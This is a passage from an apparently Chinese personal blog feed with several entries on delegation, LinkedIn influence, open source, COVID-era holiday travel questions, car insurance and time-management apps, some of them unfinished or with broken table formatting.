        <content type="html"><![CDATA[<p>做独行侠是一件很累的事情，必须观察环境、利用环境、依靠环境，将自己从繁忙中释放出来。</p><p>个人英雄主义成就的永远是个人，让价值最大化，必须去成就他人、成就团队，事实上，价值最大化的过程中，已经实现了个人英雄主义。</p><p>很多事情，知道“是什么”和“为什么”就可以点到为止了，至于“怎么做”，需要适当地放手，大多数人都是从「做」这个环节积累经验，慢慢成长起来的，如果不把这个机会交给别人，那么结果一定是“双输”的，自己会忙，他人也得不到成长。</p><p>“放权”这个词，总觉得不是很好，仿佛自己是权利的中心，需要把自己的部分权利匀点出去似的。做好上面所述的事情，需要的是信任，把后背交给他人。用“放手”这个词可能会更贴切些。</p><p>刚上手的时候，总是生疏的，会遇到甚至发生各种异常，没有关系，把问题总结好，把需要完善的事情一起做好，确保下次不再发生就行了。没有哪个人的成长是一帆风顺的。放手的过程，就是从“我教你做”，变成“我说你做”，变成“我看你做”，甚至等待着被对方超越，最后变成“你做我看”。</p><p>我们只有两只手，释放了一只手才能去干第三件事情。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何在社交媒体建立自己的影响力</title>
      <link href="/blog/2021/03/29/ogae4e/"/>
      <url>/blog/2021/03/29/ogae4e/</url>
      
        <content type="html"><![CDATA[<p>很多人都期望在社交平台上建设自己&#x2F;团队&#x2F;公司的影响力，我也关注了不少朋友，看到了他们正在尝试做这方面的工作，不得不说，过程很艰辛，结果可能没有预期的那么好。</p><p>我个人做自媒体有七八年时间了，关注量不能算特别大，但是也有了一定的粉丝积累，微博上六万多，推特一万多，领英上十万多。前两个平台是十年前注册的账号，领英上开始活跃大概是两三年前。可以简单分享下，我在<a href="https://www.linkedin.com/in/barretlee/">领英</a>上是如何慢慢积累影响力的。</p><p><strong>做这件事情，需要的不是坚持，而是热情，如果你连分享和表达的欲望都没有，很难逼着自己运维这些媒体号。</strong></p><p>在领英最开始打交道的是猎头，当时自己对领英的理解是，它就是一个找工作的平台，因此基本只讨论求职和猎头相关的话题，这个话题好像很容易成为爆点，当我讨论这个行业低门槛，甚至去喷那些不够专业的猎头时，似乎所有的人都会围过来，反喷你几句，或者支持一下。</p><p>慢慢的，我的微信多了不少猎头（四五百人吧），从一些专业的猎头身上了解到了更多的讯息，这也帮助了我在领英上发表更多关于猎头行业的见解，引来了更多的围观，算是积累了第一批关注者。</p><p>但在表达的过程中，包含了太多的负面情绪以及对猎头行业的错误认知，后来，为了不让自己成为一个吸睛的喷子，我放弃了对猎头的评头论足，转到自己感悟比较多的业务和职场的讨论。</p><p>近两年对职场成长和业务发展的思考还是蛮多的，我常常把自己的想法梳理成一段逻辑通顺、便于阅读的短文，分享到网络上，慢慢的，引来了第二批关注者，这些关注者特别喜欢参与此类话题的讨论，他们也给我带来了很多有价值的反馈，顺着这些反馈，我也输出了更多总结性的思考。<strong>你看，输入和输出总是循环着。</strong></p><p>当然，并非所有的分享都会引发讨论，必须去<strong>看到普遍性的问题，去分析问题，然后去学习</strong>，了解更多的讯息，才能够发表一篇可以说服自己也能够说服他人的文章。很多时候，为了发表一篇短文，我会看几篇、几十篇文章，甚至去看完一本书。<strong>内容发布的频度很重要，但是质量更加重要。</strong></p><p>另外一点，就是要去<strong>洞察自己的受众</strong>，看看到底是一群什么样的人在跟你交流，虽然我是一个技术人，但是在第二批关注者中大都是 HR、销售、店家、学生以及其他互联网从业人员，因此我在领英很少分享纯技术的东西，因为在这个平台分享技术，还得不到我想要的效果。</p><p>就这样过去了一年时间，由于基本上每次分享都可以带来较多的讨论和热度，我也得到领英官方的认可，他们接连两年给我评了一个领英最强档案和领英行家的称号，后来他们的运营找到了我，期望跟我建立更多的合作，合作形式不限于分享观点、回答问题、个人采访，甚至把我的照片贴到了公交站台上打广告。我很清楚，作为<strong>官方也需要不断去培养自己的 KOL</strong>，我抓住了这个机会，也与他们建立了更深的连接。</p><p>再然后，就迎来了第三个波关注，这是在平台的推动和帮助下带来的流量，我也顺势拓宽了自己发表观点的域，最近看到有不少搞技术的同学开始关注我了，这是一个很好的兆头，说明我终于可以在领英上发表更多技术讨论，也可以在这方面收获更多的反馈了。感谢大家的关注。</p><p>整个过程并非一蹴而就，这是一条厚积薄发的道路。</p><p>本文是个引子，后续视大家的兴趣度再考虑详细讨论。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>聊聊开源</title>
      <link href="/blog/2021/03/26/wwgxuu/"/>
      <url>/blog/2021/03/26/wwgxuu/</url>
      
        <content type="html"><![CDATA[<p>今天在厂里听了一个关于内部开源的讲座，邀请的一些在外部比较活跃而且做得还不错的核心开发者参与分享，整体听下来还是蛮受启发的。</p><p>大家都知道开源是一件很有价值的事情，它可以很大程度推动项目的持续发展，社区在受益以后也会反哺开源主体。可是，只要<strong>把代码扔进 github 上，那就真的是开源了么？</strong>我们经常能看到，一个项目开源以后，无人问津，让作者信心严重受挫；也能够看到好的项目由于作者的繁忙而无暇顾及那如潮水般汹涌的 PR 和 issue。事实上，<strong>开源也意味着一份责任，如果不能良好地管理和经营，那就是一次失败的开源。</strong></p><p>看到一个同学十分主动且勤劳地给项目提了一个超大的 PR，你一看，发现跟项目的重点方向不匹配，这个时候怎么办？打回去吧，于心不忍，人家这般热情；合并进来吧，不符合项目定位。诸如此类的事情在开源过程中是无法避免的。需要怎么做呢？此时你应该果断地拒绝 PR，因为这是对项目负责的表现，也不至于在这个 PR 被合并进去以后，造成项目后期难以维护的局面；但是也需要在这个过程中与贡献者建立良好的关系，<strong>开源的目的是为了让项目变得更好，越多的人参与进来，就会带来越多的能量，要学会吸收这些能量。</strong></p><p>很多开源项目，别看它十分庞大，事实上开源主体在后期只需要投入少量的成本就可以了，很可能当初靠一个团队运作的项目，到了后期就只剩下一个、半个人在搞了，为何项目还能够持续发展下去，保持着活力？背后就是因为有社区的力量，在项目发展的过程中，积累了一大批优秀的贡献者，<strong>贡献者们得到了项目的认可，项目也得到了贡献者们的认可，这就是一个好的开源项目的特征。</strong></p><p>再站在贡献者的角度，参与开源工作的动机又是什么呢？一方面可能是为了把项目改一改再带回去使用，更多的还是因为热爱，或者说喜爱，喜欢这个项目，希望它能够活下去，活的更好，因此愿意贡献自己的一把力量。是的，开源社区有时候就是这么单纯，只是为了让美好的事物变得更好而已。当然，那些为了让自己被社区认可的动机，也是值得鼓励的，毕竟你能够往 Linux 的源码里写进一行代码也算不错的本事不是么？</p><p>再回到内部开源这件事情上，一个公司庞大以后，不同团队不可避免出现造轮子的现象，也会有很多优秀的项目因为业务场景受限而无法继续成长，最终成为冢中枯骨的情况。<strong>内部开源可以一定程度帮助好的东西变得更好，帮助优秀的项目找到更多落地的场景，也可以帮助技术人找到更多同路人，这是一件十分有价值的事情。</strong>只不过在落地上相比外部开源要更难，毕竟规模是无法比拟的；不过内部开源会是一片良好的开源试验田，如果一个项目能够在内部找到一群同路人，那么放到外部就更加不用担心它的成长问题了。</p><p>开源是一个很有意思的话题，<strong>多去观察社区发展不错的开源项目</strong>，学习他们的运作模式；也<strong>多去看看那些刚刚崭露头角的启蒙项目</strong>，帮助它们快速成长，相信在这个过程中，每一方都是受益者。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>慢即是快，做一个有感情的“机器人”</title>
      <link href="/blog/2021/03/08/dc7e0f/"/>
      <url>/blog/2021/03/08/dc7e0f/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 春节返乡和返程指南</title>
      <link href="/blog/2021/01/27/gci47h/"/>
      <url>/blog/2021/01/27/gci47h/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文正在更新中…</p></blockquote><p>春节防疫政策出来以后，一脸懵逼，我天朝对细节的解释实在是太模糊了，目前仅看到两份官方的文字稿解答：</p><ul><li><a href="http://www.nhc.gov.cn/jkj/s7915/202101/f1590bbfc60a43ab81564061bc7e14fc.shtml">《冬春季农村地区新冠肺炎疫情防控工作方案》重点问题答问</a></li><li><a href="http://www.nhc.gov.cn/jkj/s7915/202101/f3fc5701ffcb4c03948a13d2b26c08a9.shtml">《冬春季农村地区新冠肺炎疫情防控工作方案》重点问题答问（二）</a></li></ul><p>如果读者有更多的官方解答，请不吝分享。严重的疫情依然挡不住我返乡的脚步，但是这个任务执行起来却遇到了不少阻碍，有哪些阻碍点呢？下面一一个列举，然后后续几天我会尝试去最权威的渠道获得答案，也欢迎小伙伴们贡献你的经验和看到的资料。</p><h2 id="从杭州回老家"><a href="#从杭州回老家" class="headerlink" title="从杭州回老家"></a>从杭州回老家</h2><blockquote><p><strong>Q1-1. 在杭州哪些地方可以进行核酸检测？</strong></p></blockquote><p><strong>打开支付宝搜索「核酸检测」</strong><br><img src="/../blogimgs/2021/01/27/1611752108613-2e139ad7-0c78-4fc6-9546-3e4b302e94fd.png" alt="image.png"><br><strong>没预约过，不知道好不好使。上门价格从 80~300+ 不等。</strong><br>**<br><strong>厂里有福利，在园区有上门检测服务。</strong></p><blockquote><p><strong>Q1-2. 大概二月初回老家，届时的排队情况如何？哪些可以稳稳的预约？</strong></p></blockquote><p>**<br>**</p><blockquote><p><strong>Q1-3. 小孩也需要核酸检测么？多小的小孩不需要核酸检测？</strong></p></blockquote><h2 id="在老家"><a href="#在老家" class="headerlink" title="在老家"></a>在老家</h2><blockquote><p><strong>Q2-1. 从</strong><a href="https://www.yicai.com/news/100906136.html"><strong>新闻</strong></a><strong>上看到，居家检测 14 天期间，健康码会变成红色？是所有地区都如此还是仅中高风险地址？</strong></p></blockquote><p>**<br>**</p><blockquote><p><strong>Q2-2. 什么时候会变成红码？自驾回家会变红码么？是否是 14 天后变成黄码，14 + 7 天后变成绿码？</strong></p></blockquote><p>**<br>**</p><blockquote><p><strong>Q2-3. 回家以后红码，7 天后的核酸检测可以去哪些地方做？排队情况如何？</strong></p></blockquote><p>**<br>**</p><blockquote><p><strong>Q2-4. 居家 14 天期间（假定红码），如果红码，是否需要向公司请假，是否可以在家办公？</strong></p></blockquote><p>**</p><h2 id="从老家回杭州"><a href="#从老家回杭州" class="headerlink" title="从老家回杭州"></a>从老家回杭州</h2><blockquote><p><strong>Q3-1. 未完成 14 天居家检测，持红码是否可以返回杭州？杭州入城策略？</strong></p></blockquote><p>**<br>**</p><blockquote><p><strong>Q3-2. 未完成 14 天居家检测，持红码是否可以进入小区？小区策略？</strong></p></blockquote><p>**<br>**</p><blockquote><p><strong>Q3-3. 返回杭州后，是否需要继续居家 14 天？策略是？</strong></p></blockquote><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><blockquote><p><strong>Q4-1. 哪些地区属于中高风险地区？</strong></p></blockquote><p>**<br><strong>打开支付宝，搜索「返乡政策」</strong><br><img src="/../blogimgs/2021/01/27/1611751928083-4e2cbc61-ec2b-4ecf-82a0-a1a4fd9a707e.png" alt="image.png">**<br><strong>进入后，往下滚动几屏，可以看到「全国高风险区播报」</strong><br><strong><img src="/../blogimgs/2021/01/27/1611751971491-d62e187f-e0af-4540-822f-cf863ca42be9.png" alt="image.png"></strong></p><blockquote><p><strong>Q4-2. 红码状态的核酸检测有啥不一样？</strong></p></blockquote><p>**<br>**</p><blockquote><p><strong>Q4-3. 返乡和返程，我朝在哪些位置设立关卡，红码状态是否允许入城？自驾会收到影响么？</strong></p></blockquote><p>**<br>**</p><blockquote><p><strong>Q4-4. 自驾急行上千公里，解决被拒入城，怎么办？投诉方式是？应急策略是？</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转变</title>
      <link href="/blog/2020/12/19/transform/"/>
      <url>/blog/2020/12/19/transform/</url>
      
        <content type="html"><![CDATA[<p>跟朋友吃饭，聊到了他的传奇历史。</p><p>十年前他还在给人家看仓库，一个月四千多，一个偶然的机会看到了 PHP 的书，摸起来学了一把，搞了一个可以增删改查的 Demo，感觉自己已经牛逼得不行，觉得这个行业很有意思，于是跑出去面试，很显然，四处碰壁……</p><p>他没有放弃，厚着脸皮继续找工作，甚至跟人家说，不要钱，有啥不懂的给时间学习就行。没想到经过不舍的努力，找到了一家月薪两千的工作，开心极了。</p><p>从那个时间开始，遇到什么不懂的就埋头学习，啥能挣钱就学啥，别人还在用 jQuery 码前端的时候，他把 Angular1.0 吃了个透，结果就是用着“先进”的技术一个人搞定三个人的活儿，一直保持如此。几年后他去了百度。</p><p>他追求自由，也不怕吃苦，但也不爱加班，在百度有段时间因为每天准点离开，被老板约谈了几次，后来调整到一个比较闲的部门，又开始了一波生猛的学习，把计算机基础重新搞了一遍，后来业务增长了，也带起团队开始打仗。</p><p>忙起来很充实，但是加班太多了，后来他离开了百度，找了一家承诺可以不加班的公司，果然一年下来都没有加过班，他又多了很多时间，仍然是看书、持续学习。</p><p>再后来他开始走进培训行业，撸起袖子就是干，拿着课程冲到一线当起了销售，那段时间他不断学习销售的知识，连续两个月成为公司的销售冠军，曾一晚上卖出一百多万的课程。自己也频繁出课，在技术领域的圈子里直播水平冲到了前列。现在是一个领域课程的总监。</p><p>就在最近，认定教育是自己的下一个目标，又是一顿狂买书，梦想是搞一个免费线上学院，给大家普及技术通识，期望通过自己的付出给社会带来一些改变。他说，这人过了三十啊，很多事情就会不由自主地想去做。</p><p>致敬敢想敢做能想能做的人。</p><hr><p>人生的每个阶段都会遇到各种各样的问题，在遇到问题的时候，多找找书，跟作者异空间对话，总能带来无尽的收获。</p><p>聊天过程中还询问了如何做直播，如果做课程，如何做销售，如何带一支讲师团队，如何帮助学员成长……深受启发。</p><p>有的时候，出门走走，见见朋友，侃侃大山，聊聊行业，也未必不是一件趣事😀</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>不恋过往，知难而行</title>
      <link href="/blog/2020/11/29/year-2020/"/>
      <url>/blog/2020/11/29/year-2020/</url>
      
        <content type="html"><![CDATA[<p>依稀还记得，5 岁的我就进入了小学学堂，比好多孩子都早了一年，因此后来不管是上大学还是走进社会，我都是同届年龄最小的那搓人，也一直觉得自己是最年轻的，这种感觉在内心驻留了许久，直到最近，才发现，<strong>自己已不再是少年</strong>。</p><p>走进商场里，购物车里坐了个娃，看着我笑；去楼下取个快递，屁股后面跟着个娃，追着我跑；躺在床上，枕头边多了个娃，盯着我看……<strong>随着孩子的长大，父亲这个角色愈演愈入戏，如今真的意识到了自己已然是一位父亲，身上兼受着满满的爱意，以及责任</strong>。</p><p>都说两岁半的孩子，进入成长的第一个叛逆期，已经有了自己独立的思维，会认为整个世界都是自己的。其实，在孩子的世界里，永远都只有爸爸、妈妈和带着玩她的姥姥；洗澡需要人陪着、吃饭需要人陪着、睡觉需要人陪着，去游乐场也需要人陪着，孩子愿意把整个世界都分享给身边的人；但是，<strong>倘若没了身边的人，她也就没了整个世界，剩下的是哭泣和不知所措。</strong></p><p>最近在问自己，时间去哪儿了？工作和生活都是忙碌的，忙着打磨公司的产品，也忙着打磨家里的小”产品”，身体已不再是那 21 岁的身体，隔三差五就会有疲惫的感觉。越来越能体会到 35+ 这个年龄段所面临的危机，相比网络上所看到的 35 岁面临失业的程序员们，庆幸的是，我还有着热爱的工作和幸福的生活。当然，我还没那么老，28 岁，😄。</p><p>曾听过同事感叹，无比珍惜开车的时光，因为在车子里才能寻得片刻的宁静。每个人都需要独立的空间，每个人也都需要思考的时间，如果两样都没有，那还真是一件遗憾的事情。挺感谢老婆，让我偶尔也能把自己关在书房里，喝着茶、看着书，写下这些文字。</p><p>前些日子，参加了公司一年一度的体检，不到两天就在内网看到了结果，很幸运，盖了个质检合格的章子。前些年长期缺少运动，再加上不良的饮食和作息习惯，都是这儿有点小毛病，那儿有点小问题，身体素质极差。去年狠下心来，节食、运动，瘦下二十来斤，身体才算进入了标准区间的边缘位置。我挺怕死的，😄，担心自己还没看够这人间繁华就变成了一抔黃土，健康是完全马虎不得的事情。</p><p>过去十年里，我经历了两次蜕变，一次是大学四年，走出了羞涩的少年；第二次是<strong>工作这六年，让我学会了思考，学会了用自己的方式去看这个世界</strong>。我为自己过去的变化而感到自豪，同时也因为这种自豪而感到羞愧——<strong>需要摸索的东西还有很多，需要改变的东西也还有很多，今天只不过是一个新的起点。</strong></p><p>今年算是转折的一年，我离开了待了六年的熟悉的淘宝，来到了离家单程远了一个小时的蚂蚁集团，当时这个选择做的很果决，内心也很清楚，自己需要跳出舒适区，找到一个更加能够刺激自己的环境，再自我升级一把。这也是一个艰难的的决定，希望未来五年后的自己再回头看这次选择，不会后悔。</p><p>2021 年我给自己制定了几个目标，像往年一样，也找个地方简单罗织一番：</p><ul><li>让更多的想法变成事实</li><li>带着家人走出家门</li><li>保持健康</li></ul><p>往年都是列举十几项，今年很少很精简，不管是工作还是生活都需要更加聚焦。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>从用户嘴里找答案</title>
      <link href="/blog/2020/11/03/answers-from-users/"/>
      <url>/blog/2020/11/03/answers-from-users/</url>
      
        <content type="html"><![CDATA[<p>我经常看到很多产品的用户反馈区充满了火药味，产品觉得用户是白痴，用户觉得产品是沙雕，造成这个局面还是在于产品对待用户的态度，因此客服的角色扮演十分重要。</p><p>客服和用户之间或多或少存在一些信息差，因此<strong>大部分答疑工作本质就是消除信息差</strong>，这就让客服的工作变得比较机械，容易在用户面前失去人性的关怀；客服潜意识会认为自己是在帮助用户了解产品、熟悉产品和使用产品，因此用户的谩骂和抱怨应该忍着，或者同样地，以牙还牙。</p><p>其实换一个视角，<strong>一个产品最终的受众仍然是这群看似跋扈的用户，能够在反馈区留言的，其实是对这个产品有所期望的，产品不符合用户的心理预期，他当然会有所怨言</strong>，而作为产品方，需要做的就是，<strong>想尽一切办法，套出用户内心深处的想法，不断挖掘他们对这个产品的思考</strong>。而这种互动是不可能出现在对骂之中的。</p><p><strong>与人产生共情的最佳渠道，就是试图去理解对方</strong>。看到用户的吐槽，不妨顺着他们的槽点，把产品的痛点给揪出来，并且明明白白的向用户承认，这些就是痛点，是产品需要改进的地方。其实大部分用户也不是那么不近人情，他们心里清楚自己只不过是情绪上的宣泄，把问题明确了以后，再跟用户进一步地讨论，这样才可能发现更深层的问题以及用户的本质诉求。</p><p><strong>产品向前发展的驱动力来自两个方面，一是产品自驱力，来自产品团队对市场的理解，以及对产品价值的思考；一是外驱力，这方面主要来自于市场的反馈，其中最核心的是用户的反馈，尤其是核心用户的反馈。</strong></p><p>从用户的嘴里找到答案是一件很有挑战的事情：</p><ul><li>用户凭什么要对你吐露心声？</li><li>用户凭什么一直对你吐露心声？</li><li>用户凭什么一直对你真诚地吐露心声？</li></ul><p>我想，明白了这一点，反馈区的火药味就会少一点，产品也会更好一点了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020 年车险购买信息整理</title>
      <link href="/blog/2020/10/29/uf6n2u/"/>
      <url>/blog/2020/10/29/uf6n2u/</url>
      
        <content type="html"><![CDATA[<p>开车好几年了，每年到点就会收到保险公司的车险推销电话，随便听上几句就跑到 APP 上交钱了，到前几天为止都还不知道啥是交强险，更不用提杂七杂八的商业险了。</p><p>花了点时间梳理了下，2020 年的车险，<a href="https://www.zhihu.com/question/291667473/answer/1447595444">这篇文章</a> 写得十分详细，险种分为两块：</p><ul><li><strong>交强险</strong>，不交不让上路，年审会查</li><li><strong>商业险</strong>，对交强险的补充，光靠交强险，一般人不敢上路，尤其是四处都是豪车的大城市</li></ul><p>下表中高亮的价格是销售给我的车险套餐的报价，信息都是看了一些文章后，整理的，大家凑合着看，应该能够大致理解一些。</p><table><thead><tr><th align="left"></th><th align="center"><strong>类别</strong></th><th align="center"><strong>功能</strong></th><th align="center"><strong>价格</strong></th><th align="center"><strong>备注</strong></th></tr></thead><tbody><tr><td align="left"><strong>交强险</strong></td><td align="center">交强险</td><td align="center">国家强缴</td><td align="center"></td><td align="center"></td></tr><tr><td align="left"><img src="/../blogimgs/2020/10/29/1603790562560-cf107054-10ef-484d-a34e-874209d9482e.png" alt="image.png"></td><td align="center">改革前，初始保费 950 元，若 3 年都不出险，最多可以优惠 30%：</td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><ul><li>第 1 年打 9 折</li><li>第 2 年打 8 折</li><li>第 3 年打 7 折</li></ul><p>而改革后，<strong>最多可打 5 折</strong>。</p><p>760元<br> | 这意味着，<strong>没发生理赔的车主，交强险价格会更便宜</strong>。 |<br>|  | 车船税 | 国家强缴，机构代收 | 360元 | 绿色能源车半价 |<br>| <strong>商业险</strong> | 机动车损失保险 | 改革后附加了很多其他险种，只需买一种<img src="/../blogimgs/2020/10/29/1603790901466-23cc6d36-f00d-49fb-9733-90dd71c1e460.png" alt="image.png"> | 保额 15w，保费 1850 元 | 改革后，一些杂七杂八的责任险都默认附加到车损险中了 |<br>|  | 第三者责任险 | </p><ul><li>它和交强险类似，赔偿的是车祸造成第三者伤亡或财产的损失，这些是开车的最大风险。</li><li>而交强险即使在改革后，如果造成第三者死亡，最多只赔 18 万；如果撞坏对方的车，最多也只赔 2000 元。</li><li>在如今人均死亡赔偿动辄百万、豪车修理费动辄数十万面前，这些赔偿额只是杯水车薪，需要 “第三者责任险” 来补充。<br> | 200万，保费 910 元 | 在保险合同中，保险人是第一方，也叫第一者；被保险人或致害人是第二方，也叫第二者；除保险人与被保险人之外的，因保险车辆的意外事故而遭受人身伤害或财产损失的受害人是第三方，也叫第三者。 |<br>|  | 车上人员责任险（司机险） | 被保险人的车上司机 | 40 元 | </li><li>救护车费用 500 住院 9000 加医疗 20w</li></ul><p>有其他套餐，单价 40&#x2F;60&#x2F;100&#x2F;200 |<br>|  | 车上人员责任险&amp;nbsp;（乘客险）<br> | 被保险人的车上乘客 | 40 * 4 &#x3D; 160 元 | 同上 |</p><p>这篇文章把车险部分贴出来，人险部分比如意外险、医疗险、重疾险和寿险等，大致弄得挺明白了，不过还没来得及整理，下次再分享吧~</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>善用工具更好地管理自己的时间</title>
      <link href="/blog/2020/10/15/manage-time-with-useful-tools/"/>
      <url>/blog/2020/10/15/manage-time-with-useful-tools/</url>
      
        <content type="html"><![CDATA[<p>大概五六年前就开始使用各类清单软件管理  TODO List，清单管理的本质是对时间的管理，在这方面有很多成熟的方法论，比如四象限管理法、番茄工作法、FAST 四部曲、GTD 工作法等等，早几年对时间管理理解不足，使用总是会出现这么几种问题：</p><ul><li>分类杂乱，基本都是按照生活、工作、学习和娱乐这四类进行分类，最后分着分着发现颗粒度太大了</li><li>清单项目的处理时间非常集中，忙的时候很忙，闲的时候很闲</li><li>无限拖延，TODO 一大堆，基本全部超期，而且还不断有增量，后面就不想管理了</li></ul><p>其实核心的问题就那么几个：</p><ol><li>重要但是不紧急的时候没有及时处理，最后全部堆积为重要且紧急的事情</li><li>事情没有细分，颗粒度过大，导致一个任务的执行时间得不到准确的记录</li><li>没有规划好今天的事情，只注重记录，不注重执行</li></ol><p>昨天给大家推荐了滴答清单这个应用，这个清单设计最巧妙的地方就在于标签和智能清单这两个功能，通过标签可以给任务提供更加丰富的元信息，以便在创建智能清单的时候进行任务筛选和分类，我的智能清单是从三个维度进行的整理：</p><ul><li>按紧急重要四象限分类，紧急性以时间为切割线，五天内为紧急，五天以后为不紧急；重要性以优先级为切割线，中、高优先级为重要，低优先级为不紧急</li><li>按事情颗粒度分类，我将颗粒度分为牛蛙、青蛙和蝌蚪三类，牛蛙就是需要被重新分解的大任务，青蛙就是比较耗时的小任务，蝌蚪就是不怎么耗时间或者不怎么耗脑子的迷你任务</li><li>按场景分类，分为工作、生活、学习和娱乐，上班时间一般只看工作类，下班以后看生活类</li></ul><p>在记录任务的时候，我会给任务标注这些信息：标签、优先级、截止时间（或时间段），打标完成以后，任务就会自动进入到各个智能分组，整理本就是件很繁琐的事情，这也是为什么我喜欢智能分组的原因。</p><p><img src="https://www.barretlee.com../blogimgs/2020/10/15/manage-time.png" width="250" /></p><p>接下来需要做的，就是每天检查、整理当天的清单任务了，确保每天有 1<del>3 个青蛙任务和 3</del>7 个蝌蚪任务，太多了精力会分散，太少了又不够充实；当遇到牛蛙任务时，可以新建一个同名的清单列表，将任务细分成青蛙任务和蝌蚪任务，这样就可以保证所有的事项都可以均匀地落在日历时间段上了。</p><p><strong>其实工具再强大，自己的时间管理理念没有跟上来，工具依然是个废物</strong>，慢慢地去尝试管理自己的时间，多去记录自己在做什么事情，然后再去回顾、优化。过去几年，我几乎尝遍了各种时间管理软件，一直觉得不好用，最近一两年转变观念后发现，即便是 Mac 原生的 Reminders 也能很好的帮助我管理任务。</p><p>当然，优秀的工具，管理起来会更顺手，滴答清单还是不错的，也推荐使用 Microsoft To Do，它除了没有日历展示能力，各方面也都是比较优秀的。</p><p><strong>管理自己的时间，本身就是一件耗时的事情，因为管理就意味着需要记录、分析然后优化，管理是为了产生更好的效果，管理是为了帮助自己更好地掌控自己的时间</strong>，花些时间去管理自己的时间，我觉得，还是很有必要的。</p><hr><p>昨天在微博上推荐的滴答清单内容：</p><p>用了半个小时的滴答清单，就付费成了高级会员，它几乎就是一个 Wunderlist 的升级版本，支持多人协同，我想要的功能都十分简洁地提供了出来，最让人满意的几点是：</p><ol><li>提供了日历视图，并且能够导入本地日历和订阅远程日历</li><li>提供了摘要功能，能够将一定时间内的 TODO List 做汇总，这不就是周报机器人么~</li><li>提供了标签组和智能组能力，可以更好地对清单进行分类、整理和呈现</li><li>将各种高频操作都统一到了右键菜单中，快捷设置好一个清单，体验做的很赞</li><li>支持微信公众号通知、查看以及直接回复以添加清单</li></ol><p>另外还有几个不错的点：</p><ul><li>支持设置任务的时间段，曾经用过的 TODO List 都是时间点，这个在日历上呈现就十分直观了</li><li>非常好地融合了番茄时钟，虽然我不怎么用的，但它这种设计会驱使我去尝试</li><li>提供了任务和笔记模板能力，比如一键创建旅行清单</li><li>提供了打卡的能力帮助培养习惯</li><li>支持几乎所有端同步</li></ul><p>整体使用体验就是，产品设计很用心，细节抠的挺多。唯一不满意的是，不支持一次性付费，需要年费订阅，不过看起来还是个迭代颇为频繁的产品，年费 139 也能接受。</p><blockquote><p>本文无意给滴答清单做广告，不过无心插柳柳成荫，重点还是希望大家了解下通过工具管理时间的一些技巧。</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>先处理情绪，再解决事情</title>
      <link href="/blog/2020/09/27/deal-with-mood-before-doing-things/"/>
      <url>/blog/2020/09/27/deal-with-mood-before-doing-things/</url>
      
        <content type="html"><![CDATA[<p>先说说近况吧，好些日子没来写东西了，这显然是出了点问题的，毕竟再忙也不能停止思考；）</p><p>最近，孩子开始上托班了。每天清晨，她都会爬到我的床边，瞅着我，用小脸磨蹭着我，把我整醒，接着陪她刷牙、洗脸，送她上学。等把她送到学校，恰好就赶上了杭州的早高峰，因此，相比前几月，就少了些许写字的时间……</p><p>最近都在干些什么呢，说起来也很有意思，我从前端工程师的角色转换到了运维角色，换了换口味，在阿里云上折腾业务，还是挺开心的。DevOps 本就是一个很有意思的工种，它的技术域很宽，需要掌握的东西很多，这段时间几乎每天都在接触新事物，收获了不少，也多了一丝成就感；不过回归事情的本质，业务先行，也不时会有些焦躁。</p><p>以前总是会去关注“我成长了多少”，似乎成长才是最重要的话题，可什么是成长呢？却也说的不是那么清楚，好像是多学了点东西，也好像是做成了某件事情，亦或是解决了某个问题。有的时候，成长似乎就只是比别人忙碌了那么一点而已。</p><p>最近我正尝试着换个角度来看待成长这件事情，去思考，<strong>别人因为我的存在学到了什么东西，别人因为我的存在做成了什么事情，别人因为我的存在解决了什么问题</strong>，这就有点意思了，也就是说，用他人的成长来反映自己的成长，而他人的成长是受自己影响的，这需要彻底打破之前的观念。</p><p>心无旁骛地做一件事情特别考验人的专注度，在向前行走的路上，遇到每一片风景都忍不住驻足一会儿，到最后才发现，风景是风景，路是路，只不过风景太诱人，遮住了前行的路。特别喜欢那些能够轻松过滤嘈杂声音的人，<strong>时刻倾听内心，打理情绪，一边行走，一边处理路边的杂草</strong>，路越来清晰，风景也越来越美。</p><p>最近学了个法子，内心焦躁时，不妨试试：闭上眼睛，静静的聆听，听听刚才的自己在想什么，想的对么，要不要去践行，把自己当成一个观众，去感受周围的一切，也包括自己，不断的抛弃脑海中紧抓不放的思绪和念想，让自己归零。时刻如此，会在某个刹那，脑海中出现短暂的空白，内心的宁静也便源于此。</p><p>时间就像是一把火，在昨天已经悄悄地烧过了人生刻度的第 28 格，希望这把火能够越来越旺，越烧越猛。加油吧，少年~</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>工作上的几个道理</title>
      <link href="/blog/2020/08/24/things-in-work/"/>
      <url>/blog/2020/08/24/things-in-work/</url>
      
